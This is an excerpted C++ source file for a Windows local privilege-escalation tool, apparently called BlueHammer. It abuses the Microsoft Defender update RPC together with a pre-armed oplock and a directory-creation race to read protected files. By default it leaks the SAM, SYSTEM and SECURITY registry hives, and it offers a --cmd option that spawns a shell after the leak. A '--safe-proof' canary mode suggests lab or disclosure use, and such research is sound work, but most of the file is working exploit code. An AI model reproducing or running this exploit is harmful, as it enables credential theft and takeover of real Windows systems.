// File updated: 2026-09-11 08:02:05 UTC
...
#pragma message("BlueHammerFix encoded canary proof enabled: BHF-SAFEPROOF-ENCODING-20260911-R10")
...
static const DWORD RPC_DIRECTORY_GRACE_MS = 30000;
static const DWORD PROGRESS_LOG_INTERVAL = 100;
static bool ShouldLogProgress(DWORD iteration, bool completed = false)
{
	return completed || (iteration && iteration % PROGRESS_LOG_INTERVAL == 0);
}
...
CabOpArguments* CUST_FNOPEN(const char* filename, int oflag, int pmode)
{
	...
	if (!cbps)
	{
		LogE("[FDI-IO] Open failed: allocation error for %s",
	...
	LogV("[FDI-IO] Open: name=%s flags=0x%X mode=0x%X size=%lu handle=%p\n",
		filename ? filename : "(null)", oflag, pmode, cbps->FileSize, cbps);
	return cbps;
}
		...
		int origin)
{
	...
	case SEEK_SET:
		...
		break;
	case SEEK_CUR:
		base = (LONGLONG)CabOpArgs->ptroffset;
		break;
	case SEEK_END:
		base = (LONGLONG)CabOpArgs->FileSize;
		break;
	default:
		LogE("[FDI-IO] Seek rejected: invalid origin=%d", origin);
		return -1;
	}

	LONGLONG target = base + (LONGLONG)offset;
	if (target < 0 || target > (LONGLONG)CabOpArgs->FileSize)
	{
		LogE("[FDI-IO] Seek rejected: origin=%d offset=%ld target=%lld size=%lu",
			origin, offset, target, CabOpArgs->FileSize);
		return -1;
	}

	CabOpArgs->ptroffset = (size_t)target;
	CabOpArgs->seekops++;
	if (ShouldLogProgress(CabOpArgs->seekops))
		LogV("[FDI-IO] Seek: operation=%lu origin=%d offset=%ld result=%lu/%lu\n",
			CabOpArgs->seekops, origin, offset,
			(unsigned long)CabOpArgs->ptroffset, CabOpArgs->FileSize);
	return (INT)CabOpArgs->ptroffset;
}
...
{
	if (!hf || !buffer || !hf->buff)
		return 0;

	if (hf->ptroffset >= hf->FileSize)
	{
		LogV("[FDI-IO] Read reached EOF: offset=%lu size=%lu\n",
			(unsigned long)hf->ptroffset, hf->FileSize);
		return 0;
	}

	DWORD remaining = hf->FileSize - (DWORD)hf->ptroffset;
	UINT actual = buffer_size < remaining ? buffer_size : remaining;
	memmove(buffer, &hf->buff[hf->ptroffset], actual);
	hf->ptroffset += actual;
	hf->readops++;
	if (ShouldLogProgress(hf->readops, hf->ptroffset >= hf->FileSize))
		LogV("[FDI-IO] Read: operation=%lu requested=%u returned=%u progress=%lu/%lu\n",
			hf->readops, buffer_size, actual,
			(unsigned long)hf->ptroffset, hf->FileSize);
	return actual;
}
		...
		unsigned int count)
{
	if (!hf || !buffer || !hf->buff)
		return 0;
	if (hf->ptroffset > hf->FileSize || count > hf->FileSize - hf->ptroffset)
	{
		LogE("[FDI-IO] Write rejected: offset=%lu count=%u capacity=%lu",
			(unsigned long)hf->ptroffset, count, hf->FileSize);
		return 0;
	}
	...
	hf->ptroffset += count;
	hf->writeops++;
	if (ShouldLogProgress(hf->writeops, hf->ptroffset >= hf->FileSize))
		LogV("[FDI-IO] Write: operation=%lu bytes=%u progress=%lu/%lu\n",
			hf->writeops, count, (unsigned long)hf->ptroffset, hf->FileSize);
	return count;
}

INT CUST_FNCLOSE(CabOpArguments* fnFileClose)
{
	LogV("[FDI-IO] Close: handle=%p seeks=%lu reads=%lu writes=%lu\n",
		fnFileClose,
		fnFileClose ? fnFileClose->seekops : 0,
		fnFileClose ? fnFileClose->readops : 0,
		fnFileClose ? fnFileClose->writeops : 0);
	free(fnFileClose);
	return 0;
}
...
INT_PTR CUST_FNFDINOTIFY(
	...
	case fdintCOPY_FILE:
		...
		if (!ptr || pfdin->cb <= 0)
		{
			LogE("[FDI] COPY_FILE rejected: context=%p size=%ld", pfdin->pv, pfdin->cb);
			return -1;
		}

		previous = *ptr;
		lcab = (CabOpArguments*)calloc(1, sizeof(CabOpArguments));
		if (!lcab)
		{
			LogE("[FDI] Node allocation failed for %s", pfdin->psz1);
			return -1;
		}
		filenamelen = strlen(pfdin->psz1);
		lcab->filename = (char*)calloc(filenamelen + 1, sizeof(char));
		lcab->FileSize = (DWORD)pfdin->cb;
		lcab->buff = (char*)calloc(lcab->FileSize, 1);
		if (!lcab->filename || !lcab->buff)
		{
			LogE("[FDI] Buffer allocation failed for %s (%lu bytes)",
				pfdin->psz1, lcab->FileSize);
			free(lcab->buff);
			free(lcab->filename);
			free(lcab);
			return -1;
		}
		memcpy(lcab->filename, pfdin->psz1, filenamelen);

		if (!previous)
			lcab->first = lcab;
		else
		{
			lcab->first = previous->first;
			previous->next = lcab;
		}
		lcab->first->index++;
		*ptr = lcab;
...
static bool ValidateCabinetCandidate(const BYTE* raw, DWORD rawsize,
	DWORD offset, DWORD* cabinetsize, WORD* foldercount, WORD* filecount)
{
	static const DWORD CAB_HEADER_MINIMUM = 36;
	if (!raw || offset > rawsize || rawsize - offset < CAB_HEADER_MINIMUM)
		return false;
	if (memcmp(raw + offset, "MSCF", 4) != 0)
		return false;
	...
	WORD cFolders = 0;
	WORD cFiles = 0;
	memcpy(&cbCabinet, raw + offset + 8, sizeof(cbCabinet));
	memcpy(&coffFiles, raw + offset + 16, sizeof(coffFiles));
	memcpy(&cFolders, raw + offset + 26, sizeof(cFolders));
	memcpy(&cFiles, raw + offset + 28, sizeof(cFiles));

	if (cbCabinet < CAB_HEADER_MINIMUM || cbCabinet > rawsize - offset)
		return false;
	if (coffFiles < CAB_HEADER_MINIMUM || coffFiles >= cbCabinet)
		return false;
	if (!cFolders || !cFiles || cFolders > 4096 || cFiles > 65535)
		return false;
	if ((ULONGLONG)CAB_HEADER_MINIMUM + (ULONGLONG)cFolders * 8ULL > cbCabinet)
		return false;
...
void* GetCabFileFromBuff(PIMAGE_DOS_HEADER pvRawData, ULONG cbRawData, ULONG* cabsz)
{
	...
	if (cabsz)
		*cabsz = 0;
	if (!pvRawData || cbRawData < 36)
	{
		LogE("[PE-CAB] Input is null or too small: buffer=%p size=%lu",
			pvRawData, cbRawData);
		SetLastError(pvRawData ? ERROR_BAD_FORMAT : ERROR_INVALID_PARAMETER);
		return NULL;
	}

	const BYTE* raw = (const BYTE*)pvRawData;
	if (cbRawData >= sizeof(IMAGE_DOS_HEADER) &&
		pvRawData->e_magic == IMAGE_DOS_SIGNATURE)
	{
		LogV("[PE-CAB] PE wrapper detected: e_lfanew=%ld\n", pvRawData->e_lfanew);
	}
	else if (memcmp(raw, "MSCF", 4) == 0)
	{
		LogV("[PE-CAB] Package is a raw cabinet without a PE wrapper\n");
	}
	else
	{
		LogW("[PE-CAB] Package has neither an MZ nor a leading MSCF signature; scanning entire payload");
	}

	DWORD bestoffset = MAXDWORD;
	DWORD bestsize = 0;
	WORD bestfolders = 0;
	WORD bestfiles = 0;
	DWORD candidates = 0;
	DWORD nextprogress = 16 * 1024 * 1024;
	for (DWORD offset = 0; offset <= cbRawData - 36; offset++)
	{
		if (offset >= nextprogress)
		{
			LogV("[PE-CAB] Scan progress=%lu/%lu (%lu%%), candidates=%lu\n",
				offset, cbRawData,
				(unsigned long)((offset * 100ULL) / cbRawData), candidates);
			nextprogress += 16 * 1024 * 1024;
		}
		if (raw[offset] != 'M' || memcmp(raw + offset, "MSCF", 4) != 0)
			continue;

		DWORD candidateSize = 0;
		WORD candidateFolders = 0;
		WORD candidateFiles = 0;
		if (!ValidateCabinetCandidate(raw, cbRawData, offset, &candidateSize,
			&candidateFolders, &candidateFiles))
		{
			LogV("[PE-CAB] Rejected MSCF-like bytes at offset=%lu\n", offset);
			continue;
		}

		candidates++;
		LogV("[PE-CAB] Valid candidate #%lu: offset=%lu size=%lu folders=%u files=%u\n",
			candidates, offset, candidateSize, candidateFolders, candidateFiles);
		if (candidateSize > bestsize)
		{
			bestoffset = offset;
			bestsize = candidateSize;
			bestfolders = candidateFolders;
			bestfiles = candidateFiles;
		}
		offset += candidateSize - 1;
	}

	if (bestoffset == MAXDWORD)
	{
		LogE("[PE-CAB] No structurally valid MSCF cabinet was found in %lu bytes",
			cbRawData);
	...
	if (cabsz)
		*cabsz = bestsize;
	LogV("[PE-CAB] Selected largest cabinet: offset=%lu size=%lu folders=%u files=%u address=%p\n",
		bestoffset, bestsize, bestfolders, bestfiles, raw + bestoffset);
	SetLastError(ERROR_SUCCESS);
	return (void*)(raw + bestoffset);
}
...
static bool ReadUpdateCache(const wchar_t* cachepath, void** outbuff, DWORD* outsize)
{
	...
	while (done < total)
	{
		...
		chunkindex++;
		if (ShouldLogProgress(chunkindex, done == total))
...
static bool WriteUpdateCache(const wchar_t* cachepath, const void* buff, DWORD size)
{
	...
	while (done < size)
	{
		...
		chunkindex++;
		if (ShouldLogProgress(chunkindex, done == size))
...
acquirepackage:
	...
	else
	{
		...
		LogV("[UPDATE] HTTP response: status_ok=%s status=%lu error=%lu\n",
			...
			if (httpstatusok && (httpstatus < 200 || httpstatus >= 300))
				UPDATE_FAIL("CDN returned a non-success HTTP status", ERROR_HTTP_INVALID_SERVER_RESPONSE);

			static const DWORD INITIAL_DOWNLOAD_CAPACITY = 8 * 1024 * 1024;
			static const DWORD MAX_UPDATE_PACKAGE_BYTES = 512 * 1024 * 1024;
			DWORD expectedsize = 0;
			DWORD expectedsizebytes = sizeof(expectedsize);
			BOOL havelength = HttpQueryInfoW(hint2,
				HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
				&expectedsize, &expectedsizebytes, NULL);
			DWORD lengtherror = havelength ? ERROR_SUCCESS : GetLastError();
			if (havelength)
				LogV("[UPDATE] HTTP Content-Length=%lu bytes\n", expectedsize);
			else
				LogW("[UPDATE] HTTP Content-Length unavailable (error=%lu); reading until EOF",
					lengtherror);
			if (expectedsize > MAX_UPDATE_PACKAGE_BYTES)
				UPDATE_FAIL("update package exceeds the configured size limit", ERROR_FILE_TOO_LARGE);

			DWORD capacity = expectedsize ? expectedsize : INITIAL_DOWNLOAD_CAPACITY;
			if (!capacity)
				capacity = INITIAL_DOWNLOAD_CAPACITY;
			exebuff = malloc(capacity);
			if (!exebuff)
				UPDATE_FAIL("update-package allocation failed", ERROR_NOT_ENOUGH_MEMORY);
			LogV("[UPDATE] Download buffer allocated: capacity=%lu expected=%lu\n",
			...
			for (;;)
			{
				if (readsz == capacity)
				{
					if (capacity >= MAX_UPDATE_PACKAGE_BYTES)
					{
						BYTE overflowbyte = 0;
						DWORD overflowread = 0;
						if (!InternetReadFile(hint2, &overflowbyte, 1, &overflowread))
							UPDATE_FAIL("InternetReadFile failed at the size limit", GetLastError());
						if (!overflowread)
							break;
						UPDATE_FAIL("update package exceeded the configured size limit", ERROR_FILE_TOO_LARGE);
					}

					DWORD newcapacity = capacity > MAX_UPDATE_PACKAGE_BYTES / 2 ?
						MAX_UPDATE_PACKAGE_BYTES : capacity * 2;
					void* grown = realloc(exebuff, newcapacity);
					if (!grown)
						UPDATE_FAIL("download-buffer growth failed", ERROR_NOT_ENOUGH_MEMORY);
					exebuff = grown;
					LogV("[UPDATE] Download buffer grown: old=%lu new=%lu\n",
						capacity, newcapacity);
					capacity = newcapacity;
				}

				DWORD got = 0;
				DWORD remaining = capacity - readsz;
				DWORD requestsize = remaining > 1024 * 1024 ? 1024 * 1024 : remaining;
				if (!InternetReadFile(hint2, (BYTE*)exebuff + readsz, requestsize, &got))
				{
					DWORD readerror = GetLastError();
					LogE("[UPDATE] InternetReadFile failed at %lu bytes, error=%lu",
						readsz, readerror);
					UPDATE_FAIL("InternetReadFile failed", readerror);
				}
				if (!got)
				{
					LogV("[DOWNLOAD] EOF received after %lu chunks\n", downloadchunk);
					break;
				}
				readsz += got;
				downloadchunk++;
				bool downloadcomplete = expectedsize && readsz >= expectedsize;
				if (ShouldLogProgress(downloadchunk, downloadcomplete))
				{
					if (expectedsize)
						LogV("[DOWNLOAD] chunk=%lu requested=%lu received=%lu progress=%lu/%lu (%lu%%)\n",
							downloadchunk, requestsize, got, readsz, expectedsize,
							(unsigned long)((readsz * 100ULL) / expectedsize));
					else
						LogV("[DOWNLOAD] chunk=%lu requested=%lu received=%lu total=%lu capacity=%lu\n",
							downloadchunk, requestsize, got, readsz, capacity);
				}
			}
			if (!readsz)
				UPDATE_FAIL("CDN returned an empty response body", ERROR_HANDLE_EOF);
			if (expectedsize && expectedsize != readsz)
				LogW("[UPDATE] Content-Length mismatch: expected=%lu actual=%lu; validating actual bytes",
					expectedsize, readsz);
			sz = readsz;
	...
	//printf("Done.\n");
		...
		if (!mappedbuff)
		{
			DWORD cabineterror = GetLastError();
			LogE("[UPDATE] Invalid package source=%s, parser_error=%lu (0x%08lX)",
				loadedfromcache ? "cache" : "network", cabineterror,
				(unsigned long)cabineterror);
			...
			UPDATE_FAIL("no valid cabinet was found in the update package",
				cabineterror ? cabineterror : ERROR_BAD_FORMAT);
		}
...
retry:
	...
	{
		if (ShouldLogProgress(openattempts))
...
struct AppOptions
{
	...
	bool safeProofMode = false;   // leak only a harmless SYSTEM/Administrators-only canary
	bool verbose = false;         // concise stage output by default; --verbose enables full tracing
...
static const char TRACE_BUILD_ID[] = "BHF-SAFEPROOF-ENCODING-20260911-R10";
static const wchar_t SAFE_PROOF_TARGET[] =
	L"\\ProgramData\\BlueHammerLab\\SYSTEM_ONLY_PROOF.txt";
static const wchar_t SAFE_PROOF_DOS_PATH[] =
	L"%ProgramData%\\BlueHammerLab\\SYSTEM_ONLY_PROOF.txt";
static const wchar_t SAFE_PROOF_OUTPUT[] = L".\\BlueHammer-SUCCESS.txt";
static const char SAFE_PROOF_MAGIC[] = "BLUEHAMMER_SYSTEM_ONLY_PROOF";
static const DWORD SAFE_PROOF_MAX_BYTES = 4096;
static const DWORD SAFE_PROOF_SCAN_BYTES = 256;
...
static bool ValidateSafeProofPayload(const void* payload, DWORD payloadbytes,
	const char** detectedencoding, DWORD* detectedoffset)
{
	if (detectedencoding)
		*detectedencoding = "none";
	if (detectedoffset)
		*detectedoffset = 0;
	if (!payload || !payloadbytes || payloadbytes > SAFE_PROOF_MAX_BYTES)
		return false;

	const BYTE* bytes = (const BYTE*)payload;
	const size_t magiclength = strlen(SAFE_PROOF_MAGIC);
	const size_t scanbytes = payloadbytes < SAFE_PROOF_SCAN_BYTES ?
		payloadbytes : SAFE_PROOF_SCAN_BYTES;

	for (size_t offset = 0; offset + magiclength <= scanbytes; offset++)
	{
		if (memcmp(bytes + offset, SAFE_PROOF_MAGIC, magiclength) == 0)
		{
			if (detectedencoding)
				*detectedencoding = offset >= 3 && bytes[offset - 3] == 0xEF &&
					bytes[offset - 2] == 0xBB && bytes[offset - 1] == 0xBF ?
					"UTF-8-BOM/ASCII" : "ASCII/UTF-8";
			if (detectedoffset)
				*detectedoffset = (DWORD)offset;
			return true;
		}
	}

	const size_t widebytes = magiclength * 2;
	for (size_t offset = 0; offset + widebytes <= scanbytes; offset++)
	{
		bool littleendian = true;
		bool bigendian = true;
		for (size_t i = 0; i < magiclength; i++)
		{
			BYTE expected = (BYTE)SAFE_PROOF_MAGIC[i];
			if (bytes[offset + i * 2] != expected || bytes[offset + i * 2 + 1] != 0)
				littleendian = false;
			if (bytes[offset + i * 2] != 0 || bytes[offset + i * 2 + 1] != expected)
				bigendian = false;
		...
		{
			if (detectedencoding)
				*detectedencoding = littleendian ? "UTF-16LE" : "UTF-16BE";
			if (detectedoffset)
				*detectedoffset = (DWORD)offset;
			return true;
		}
...
static DWORD WaitOneWithHeartbeat(HANDLE handle, DWORD timeoutms, const char* label)
{
	...
	for (;;)
	{
		...
		{
			heartbeat++;
			if (ShouldLogProgress(heartbeat))
...
static void PrintUsage()
{
	printf(
		...
		"Safe validation:\n"
		"  --safe-proof                        Read only the pre-created protected lab canary\n\n"
		"Actions:\n"
		"  --cmd                               Spawn an interactive cmd.exe after leaking (requires SAM)\n\n"
		"Other:\n"
		"  --force                             Skip the advisory Windows Update API check\n"
		"  --verbose                           Enable the full diagnostic trace\n"
		"  --quiet                             Keep the default concise stage output\n"
		"  --help                              Show this help\n"
	);
}
...
static bool ParseArgs(int argc, wchar_t* argv[], AppOptions& opt)
{
	...
	for (int i = 1; i < argc; i++)
	{
		...
		if (_wcsicmp(argv[i], L"--safe-proof") == 0)
		{
			opt.safeProofMode = true;
			continue;
		}
	...
	if (opt.safeProofMode)
	{
		if (!opt.leakTargets.empty() || !opt.outFileSingle.empty() ||
			!opt.outDir.empty() || opt.spawnCmdShell)
		{
			LogE("[ARGS] --safe-proof cannot be combined with --dump, --leak, --out, --out-dir, or --cmd");
			return false;
		}
		if (!addTarget(SAFE_PROOF_TARGET))
			return false;
		opt.outFileSingle = SAFE_PROOF_OUTPUT;
	}
	// If no explicit leak selection was made, default to all three hives.
	else if (opt.leakTargets.empty())
	{
		addTarget(L"\\Windows\\System32\\Config\\SAM");
		addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
		addTarget(L"\\Windows\\System32\\Config\\SECURITY");
...
int wmain(int argc, wchar_t* argv[])
{
	...
	LogS("[BUILD-MARKER] %s; compiled=%s %s; source=FunnyApp.cpp",
	...
	if (opt.safeProofMode)
	{
		wchar_t proofpath[MAX_PATH] = { 0 };
		DWORD proofchars = ExpandEnvironmentStringsW(SAFE_PROOF_DOS_PATH,
			proofpath, MAX_PATH);
		if (!proofchars || proofchars >= MAX_PATH)
		{
			LogE("[SAFE-PROOF] Failed to resolve the protected canary path: error=%lu", GetLastError());
			return 2;
		}
		HANDLE directproof = CreateFileW(proofpath, GENERIC_READ,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
			OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (directproof && directproof != INVALID_HANDLE_VALUE)
		{
			CloseHandle(directproof);
			LogE("[SAFE-PROOF] Canary is directly readable; its ACL does not prove a privilege boundary: %ws", proofpath);
			return 2;
		}
		DWORD directerror = GetLastError();
		if (directerror != ERROR_ACCESS_DENIED)
		{
			LogE("[SAFE-PROOF] Direct read failed with %lu instead of ACCESS_DENIED; create the canary first: %ws",
				directerror, proofpath);
			return 2;
		}
		DWORD oldproofattrs = GetFileAttributesW(SAFE_PROOF_OUTPUT);
		if (oldproofattrs != INVALID_FILE_ATTRIBUTES)
		{
			LogE("[SAFE-PROOF] Stale output exists; rename or remove it before this run: %ws", SAFE_PROOF_OUTPUT);
			return 2;
		}
	}
	#if defined(__MINGW32__)
	LogV("[BUILD] MinGW-w64 build detected; native RpcTryExcept SEH is unavailable\n");
	...
	bool safeProofPayloadVerified = false;
	/*
	if (argc >= 2) {
...
#define FLOW_FAIL_WIN32(stage, reason) \
	...
	try {
		...
		for (int x = 0; x < 1; x++) // single WD update pass — leak selected targets simultaneously (up to 3)
		{
			...
			FLOW_STAGE("defender-rpc-and-oplock");
			...
			// Prepare the source-file oplock before dispatching the Defender RPC.
			// Keep this handle shared and do not mark the file delete-pending: an
			// exclusive FILE_DELETE_ON_CLOSE pre-arm can make the staged resource
			// unavailable to Defender before its RPC worker creates the directory.
			wcscpy(updatelibpath, L"\\??\\");
			wcscat(updatelibpath, updatepath);
			wcscat(updatelibpath, L"\\mpasbase.vdm");
			flowstage = "oplock-prearm";
			LogV("[OPLOCK] Pre-opening staged file before RPC=%ws\n", updatelibpath);

			RtlInitUnicodeString(&unistrupdatelibpath, updatelibpath);
			InitializeObjectAttributes(&objattr, &unistrupdatelibpath,
				OBJ_CASE_INSENSITIVE, NULL, NULL);
			const ULONG stagedShareAccess =
				FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;
			const ULONG stagedCreateOptions = FILE_NON_DIRECTORY_FILE;
			LogV("[OPLOCK] Open policy: share=READ|WRITE|DELETE, delete_on_close=no\n");
			ntstat = NtCreateFile(&hupdatefile,
				GENERIC_READ | DELETE | SYNCHRONIZE,
				&objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL,
				stagedShareAccess, FILE_OPEN, stagedCreateOptions, NULL, 0);
			if ((LONG)ntstat < 0)
			{
				DWORD openerror = RtlNtStatusToDosError(ntstat);
				LogE("[OPLOCK] Pre-open failed: ntstatus=0x%08lX, win32=%lu",
					(unsigned long)ntstat, openerror);
				FLOW_FAIL("oplock-prearm", "NtCreateFile(staged mpasbase.vdm) failed", ntstat);
			}

			ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (!ovd.hEvent)
				FLOW_FAIL_WIN32("oplock-prearm", "CreateEvent(oplock) failed");
			SetLastError(ERROR_SUCCESS);
			BOOL oplockimmediate = DeviceIoControl(hupdatefile,
				FSCTL_REQUEST_BATCH_OPLOCK, NULL, 0, NULL, 0, NULL, &ovd);
			DWORD oplockstatus = oplockimmediate ? ERROR_SUCCESS : GetLastError();
			if (oplockimmediate || oplockstatus != ERROR_IO_PENDING)
			{
				FLOW_FAIL("oplock-prearm", "staged-file oplock was not left pending",
					oplockimmediate ? ERROR_OPLOCK_NOT_GRANTED : oplockstatus);
			}
			LogV("[OPLOCK] Pre-armed before RPC: handle=%p event=%p\n",
				hupdatefile, ovd.hEvent);
			flowstage = "defender-rpc-directory-watch";
			...
			bool rpccompletedbeforewatch = false;
			DWORD rpccompletiontick = 0;
			do {
				...
				if (!rpccompletedbeforewatch)
				{
					HANDLE events[2] = { od.hEvent, threadargs.hevent };
					LogV("[WATCH] Waiting up to %lu ms for directory creation or RPC completion\n",
						LAB_WAIT_TIMEOUT_MS);
					waitresult = WaitManyWithHeartbeat(2, events, FALSE,
						LAB_WAIT_TIMEOUT_MS, "definition-directory-or-rpc");
					LogV("[WATCH] Combined wait returned 0x%08lX\n",
						(unsigned long)waitresult);

					if (waitresult == WAIT_OBJECT_0 + 1)
					{
						rpccompletedbeforewatch = true;
						rpccompletiontick = GetTickCount();
						DWORD rpcfailure = threadargs.res ? (DWORD)threadargs.res :
							(DWORD)threadargs.serverstatus;
						LogV("[RPC] Completion arrived before directory notification: return=0x%08lX, server_status=0x%08lX\n",
							(unsigned long)threadargs.res,
							(unsigned long)threadargs.serverstatus);
						if (rpcfailure)
						{
							if ((DWORD)threadargs.serverstatus == 0x8050A003)
								LogE("[RPC] Defender rejected this update package as not applicable (0x8050A003); waiting longer cannot create the directory");
							if (rpcfailure == 0x80070714UL ||
								rpcfailure == ERROR_RESOURCE_DATA_NOT_FOUND)
							{
								LogE("[RPC] 0x80070714 maps to ERROR_RESOURCE_DATA_NOT_FOUND (1812): Defender could not consume the staged update resource");
								LogE("[RPC] R7 pre-arms mpasbase.vdm with full sharing and without FILE_DELETE_ON_CLOSE; if this persists, verify the cached definition package matches the snapshot");
							}
							CancelPendingIoWithTrace(hdir, &od, "WATCH");
							CloseHandle(od.hEvent);
							FLOW_FAIL("defender-rpc-directory-watch",
								"RPC failed before directory creation", rpcfailure);
						}

						LogW("[RPC] RPC completed successfully before the directory notification; keeping watcher armed for %lu ms",
							RPC_DIRECTORY_GRACE_MS);
						waitresult = WaitOneWithHeartbeat(od.hEvent,
							RPC_DIRECTORY_GRACE_MS, "post-rpc-directory-grace");
					}
				}
				else
				{
					DWORD graceelapsed = GetTickCount() - rpccompletiontick;
					if (graceelapsed >= RPC_DIRECTORY_GRACE_MS)
					{
						CancelPendingIoWithTrace(hdir, &od, "WATCH");
						CloseHandle(od.hEvent);
						FLOW_FAIL("defender-rpc-directory-watch",
							"RPC succeeded but directory grace period expired", WAIT_TIMEOUT);
					}
					DWORD graceremaining = RPC_DIRECTORY_GRACE_MS - graceelapsed;
					LogV("[WATCH] RPC already completed successfully; waiting %lu ms for a later directory notification\n",
						graceremaining);
					waitresult = WaitOneWithHeartbeat(od.hEvent, graceremaining,
						"post-rpc-directory-rearm");
				}
				if (waitresult == WAIT_TIMEOUT)
				{
					CancelPendingIoWithTrace(hdir, &od, "WATCH");
					CloseHandle(od.hEvent);
					FLOW_FAIL("defender-rpc-directory-watch",
						rpccompletedbeforewatch ?
						"RPC succeeded but no directory notification arrived during grace period" :
						"Timed out waiting for Defender directory creation",
						WAIT_TIMEOUT);
				}
				if (waitresult != WAIT_OBJECT_0)
				{
			...
			LogV("[OPLOCK] Directory observed; waiting up to %lu ms for the pre-armed oplock break\n",
				LAB_WAIT_TIMEOUT_MS);
			DWORD oplockwait = WaitOneWithHeartbeat(ovd.hEvent,
				LAB_WAIT_TIMEOUT_MS, "staged-file-oplock-break");
			if (oplockwait == WAIT_TIMEOUT)
			{
				DWORD rpcwait = threadargs.hevent ?
					WaitForSingleObject(threadargs.hevent, 0) : WAIT_FAILED;
				LogE("[OPLOCK] No break after pre-arm: rpc_wait=0x%08lX, rpc_return=0x%08lX, server_status=0x%08lX",
					(unsigned long)rpcwait, (unsigned long)threadargs.res,
					(unsigned long)threadargs.serverstatus);
			...
			for (int ri = 0; ri < leakCount; ri++)
			{
				...
				for (;;)
				{
					...
					if (ShouldLogProgress(leakattempts))
				...
				if (opt.safeProofMode)
				{
					const char* proofencoding = "none";
					DWORD proofoffset = 0;
					if (!ValidateSafeProofPayload(leakedfilebuff, __readsz,
						&proofencoding, &proofoffset))
					{
						const BYTE* proofbytes = (const BYTE*)leakedfilebuff;
						DWORD prefixbytes = __readsz < 16 ? __readsz : 16;
						char proofprefix[16 * 3 + 1] = { 0 };
						for (DWORD pi = 0; pi < prefixbytes; pi++)
							sprintf(&proofprefix[pi * 3], "%02X ", proofbytes[pi]);
						LogE("[SAFE-PROOF] Payload mismatch: bytes=%lu, accepted_max=%lu, prefix=%s",
							__readsz, SAFE_PROOF_MAX_BYTES,
							prefixbytes ? proofprefix : "(empty)");
						FLOW_FAIL("safe-proof-validation",
							"Protected canary payload did not match the expected marker",
							ERROR_INVALID_DATA);
					}
					LogV("[SAFE-PROOF] Payload matched: encoding=%s, byte_offset=%lu, size=%lu\n",
						proofencoding, proofoffset, __readsz);
					safeProofPayloadVerified = true;
				}
			...
			if (opt.safeProofMode && !safeProofPayloadVerified)
				FLOW_FAIL("safe-proof-validation",
					"Protected canary output was not verified", ERROR_INVALID_DATA);
			flowstage = "complete";
			...
			processresult = 0;
			if (opt.safeProofMode)
				LogS("[SUCCESS] Direct read was denied, but the protected canary was recovered as .\\BlueHammer-SUCCESS.txt\n");
			else
				LogS("[SUCCESS] Flow completed; all requested outputs were written\n");
...
cleanup:
	...
	if (updatefilerenamed && newname[0])
	{
		if (!DeleteFileW(newname) && GetLastError() != ERROR_FILE_NOT_FOUND)
			LogV("[CLEANUP] DeleteFileW(renamed staged file) failed: path=%ws, error=%lu\n",
				newname, GetLastError());
		else
			LogV("[CLEANUP] Removed renamed staged file=%ws\n", newname);
	}
